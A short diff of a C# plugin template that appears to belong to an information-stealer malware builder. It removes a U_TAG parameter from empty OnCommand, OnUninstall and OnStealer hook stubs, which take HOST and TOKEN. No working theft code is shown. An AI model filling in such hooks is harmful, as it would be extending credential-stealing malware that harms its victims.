@@ -21,19 +21,19 @@ public class DPlugin
     public static string CommandName = "MyTestCommand";
     
     //Delete this method, if you don't use commands.
-    public void OnCommand(string CommandParameter, string HOST, string TOKEN, string PATH, string U_TAG)
+    public void OnCommand(string CommandParameter, string HOST, string TOKEN, string PATH)
     {
         //YOUR CODE ON COMMAND EXECUTE
     }
     
     //Delete this method, if you don't provide actions after deleting build.
-    public void OnUninstall(string HOST, string TOKEN, string PATH, string U_TAG)
+    public void OnUninstall(string HOST, string TOKEN, string PATH)
     {
         //YOUR CODE ON BUILD UNINSTALL
     }
     
     //Delete this method, if you don't provide actions after execute stealer.
-    public List<object[]> OnStealer(string HOST, string TOKEN, string PATH, string U_TAG)
+    public List<object[]> OnStealer(string HOST, string TOKEN, string PATH)
     {
         List<object[]> Content = new List<object[]>();
         
